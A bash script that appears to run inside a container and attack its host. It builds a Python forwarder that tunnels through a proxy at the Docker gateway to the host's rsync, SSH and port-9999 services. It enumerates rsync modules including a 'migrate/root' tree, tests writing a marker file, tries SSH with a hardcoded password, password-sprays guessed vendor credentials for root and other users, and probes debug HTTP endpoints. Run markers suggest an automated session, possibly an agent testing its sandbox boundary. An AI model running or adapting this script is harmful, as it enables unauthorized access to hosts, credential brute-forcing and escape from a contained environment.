#!/bin/bash
set +e
echo "###P18START $(date -u)"
cat > /tmp/fwd.py <<'PY'
import socket,threading,sys
LP=int(sys.argv[1]); TP=int(sys.argv[2]); PROXY=("172.17.0.1",1080)
def pipe(a,b):
    try:
        while True:
            d=a.recv(65536)
            if not d: break
            b.sendall(d)
    except Exception: pass
    try: b.shutdown(socket.SHUT_WR)
    except Exception: pass
def handle(c):
    try:
        s=socket.create_connection(PROXY,timeout=8)
        s.sendall(("CONNECT 127.0.0.1:%d HTTP/1.1\r\nHost: 127.0.0.1:%d\r\n\r\n"%(TP,TP)).encode())
        buf=b""
        while b"\r\n\r\n" not in buf:
            d=s.recv(4096)
            if not d: break
            buf+=d
        if b"200" not in buf.split(b"\r\n")[0]: c.close(); s.close(); return
        threading.Thread(target=pipe,args=(c,s),daemon=True).start()
        pipe(s,c)
    except Exception: 
        try: c.close()
        except Exception: pass
srv=socket.socket(); srv.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
srv.bind(("127.0.0.1",LP)); srv.listen(50)
while True:
    c,_=srv.accept(); threading.Thread(target=handle,args=(c,),daemon=True).start()
PY
nohup python3 /tmp/fwd.py 11234 1234 >/tmp/f1.log 2>&1 &
nohup python3 /tmp/fwd.py 10022 22 >/tmp/f2.log 2>&1 &
nohup python3 /tmp/fwd.py 19999 9999 >/tmp/f3.log 2>&1 &
sleep 2
echo "=== RSYNC-MODULES ==="
timeout 20 rsync rsync://127.0.0.1:11234/ 2>&1 | head -20
echo "=== RSYNC-MIGRATE-LIST ==="
timeout 30 rsync -n -r rsync://127.0.0.1:11234/migrate/ 2>&1 | head -40
echo "=== RSYNC-MIGRATE-DEEP ==="
timeout 30 rsync -n -r --no-motd rsync://127.0.0.1:11234/migrate/root/ 2>&1 | head -30
echo "=== RSYNC-WRITE-TEST ==="
echo "i4291 $(date -u)" > /tmp/mark.txt
timeout 25 rsync -v /tmp/mark.txt rsync://127.0.0.1:11234/migrate/ 2>&1 | tail -5
echo "=== HOSTSSHD-BANNER+USERS ==="
timeout 8 bash -c 'exec 3<>/dev/tcp/127.0.0.1/10022; head -c 100 <&3' 2>&1 | tr -d '\r'
export SSHPASS='/&S2)n@W1G'
for u in root ubuntu onething oneai admin one; do
  r=$(timeout 22 sshpass -e ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 -o PreferredAuthentications=password -o PubkeyAuthentication=no -p 10022 $u@127.0.0.1 'id;hostname;nvidia-smi -L|head -9' 2>&1 | tail -3 | tr '\n' '|')
  echo "$u :: ${r:0:200}"
done
echo "=== HOSTSSHD-PWSPRAY ==="
for pw in admin onething Onething@2024 OneThingAI@2024 'Onething@123' Aa123456 root toor; do
  for u in root ubuntu onething; do
    r=$(timeout 16 sshpass -p "$pw" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 -o PreferredAuthentications=password -o PubkeyAuthentication=no -p 10022 $u@127.0.0.1 'id' 2>&1 | tail -1)
    case "$r" in *denied*|*"timed out"*|"") ;; *) echo "HIT $u:$pw :: $r";; esac
  done
done
echo "=== XYIPK9999 ==="
for u in / /health /api /api/v1 /version /metrics /status /debug/pprof/; do printf "%s " "$u"; timeout 6 curl -s -o /tmp/x.$$ -w "c=%{http_code} l=%{size_download} " "http://127.0.0.1:19999$u"; head -c 100 /tmp/x.$$ | tr '\n' ' '; echo; done
echo "###P18END $(date -u)"
# run2 1795548353
